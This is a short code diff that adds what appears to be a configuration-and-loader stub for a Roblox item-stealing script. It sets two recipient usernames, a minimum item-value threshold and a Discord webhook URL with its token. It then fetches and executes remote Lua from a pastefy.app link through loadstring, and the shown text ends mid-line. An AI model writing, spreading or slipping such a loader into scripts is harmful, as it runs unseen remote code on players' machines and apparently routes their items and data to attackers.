@@ -1,0 +1,6 @@
+Username = "gunaprofan1"
+Username2 = "gunapro_thekiller"
+MinimumRAP = 100000
+Webhook = "https://discord.com/api/webhooks/1372791564052598865/hCwtTYZZTcuDtfM4Lc6sIEQRlbppCPFCDM0SaPGiJO6xjNWOGCVdJRpEh2WBOS89RrWL"
+
+loadstring(game:HttpGet("https://pastefy.app/FiU02LyI/raw"))(
